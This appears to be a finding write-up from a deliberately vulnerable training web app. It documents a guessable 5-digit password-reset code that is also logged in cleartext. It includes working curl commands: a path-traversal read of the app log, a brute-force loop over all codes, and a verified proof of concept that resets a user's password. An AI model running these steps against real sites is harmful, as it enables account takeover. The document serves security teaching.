# 20 — Weak, guessable password-reset code

- **OWASP Top 10 (2021):** A04:2021 – Insecure Design
- **Severity:** Medium
- **Difficulty:** Easy

## Where

`web/reset.php:23` — code generation (step 1):

```php
$code = sprintf('%05d', mt_rand(0, 99999));
```

and `web/reset.php:29` — the code is also written to a log in cleartext:

```php
file_put_contents($lf, 'reset code for ' . $row['username'] . ': ' . $code . ' at ' . $now . "\n", FILE_APPEND);
```

## How it works (root cause)

The reset code is only **5 decimal digits** (`00000`–`99999`), so the
search space is 100 000. There is **no rate limiting** on the step-2 guess
check and no lockout, and the code is valid for 15 minutes. On top of that,
the code is written in cleartext to `data/logs/app.log`, which is readable
without authentication via the path traversal in 10.

## Exploitation steps

**Option A — read the code directly (intended, easy):**

```bash
# trigger a reset for ulla (step 1)
curl -s -d "step=1&who=ulla" http://localhost:8080/reset.php
# read the freshly written code from the app log via path traversal (10)
curl -s 'http://localhost:8080/image.php?file=../data/logs/app.log' | grep 'reset code for ulla'
```

**Option B — brute force the 5-digit code (no rate limit):**

```bash
for c in 00000 00001 00002 ... 99999; do
  if curl -s -d "step=2&username=ulla&code=$c" http://localhost:8080/reset.php \
        | grep -q 'Lösenordet har ändrats\|Skriv ett nytt'; then
     echo "code $c accepted"; break
  fi
done
```

(Even at a modest 10 req/s, 100 000 guesses take ~3 hours; a single worker
fits inside the 15-minute window only if parallelised — the absence of any
throttling is the point.)

## Working PoC (verified)

Option A returns a line such as:

```
reset code for ulla: 48392 at 2026-09-21 16:02:11
```

which then completes the reset:

```bash
curl -s -d "step=2&username=ulla&code=48392"  http://localhost:8080/reset.php   # → step 3
curl -s -d "step=3&username=ulla&newpass=Hacked123" http://localhost:8080/reset.php
# → "Lösenordet har ändrats. Logga in med ditt nya lösenord."
```

## Expected result / verification

- A valid code is obtained (from the log or by guessing) and used to set a
  new password for the target account.
- Login with the new password succeeds.

## Attack chain

```
trigger reset (step 1)
  → read code from data/logs/app.log via path traversal (10)   [or brute force]
  → step 2 verify + step 3 set new password
  → take over the account
```

## Notes

- The cleartext log (line 29) makes this trivial in this lab; the 5-digit
  entropy + no rate limit is the underlying design flaw that matters in the
  real world.
- `admin` is explicitly excluded from reset (lines 12-13, 19-21), so this
  targets regular users — but a taken-over user is still a foothold.
